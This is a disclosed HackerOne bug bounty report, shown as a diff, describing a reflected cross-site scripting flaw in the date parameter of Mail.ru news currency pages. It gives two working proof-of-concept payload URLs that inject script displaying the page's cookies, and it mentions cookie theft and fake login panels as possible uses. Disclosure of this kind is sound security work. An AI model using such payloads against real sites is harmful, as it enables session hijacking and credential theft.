@@ -1,0 +1,19 @@
+ReportLink:https://hackerone.com/reports/94517
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/mak
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:11.12.2015 10:53:33
+
+Summary:
+
+Hello folks I know this is out of scope for a bounty but I thought I'd report it anyway.
+The XSS appears in the date parameter and there are two examples below.
+
+https://news.mail.ru/currency.html?date=%22%3E%3Csvg%3E%3Cscript%3E/%3C@/%3Eprompt%28document.domain,document.cookie%29%3C/script%3E
+
+https://admin.news.mail.ru/currency.html?date=%22%3E%3Csvg%3E%3Cscript%3E/%3C@/%3Eprompt%28document.domain,document.cookie%29%3C/script%3E
+
+This can be used to display false information, including fake news articles or a fake login panel to steal credentials. It may also be possible to steal session cookies.
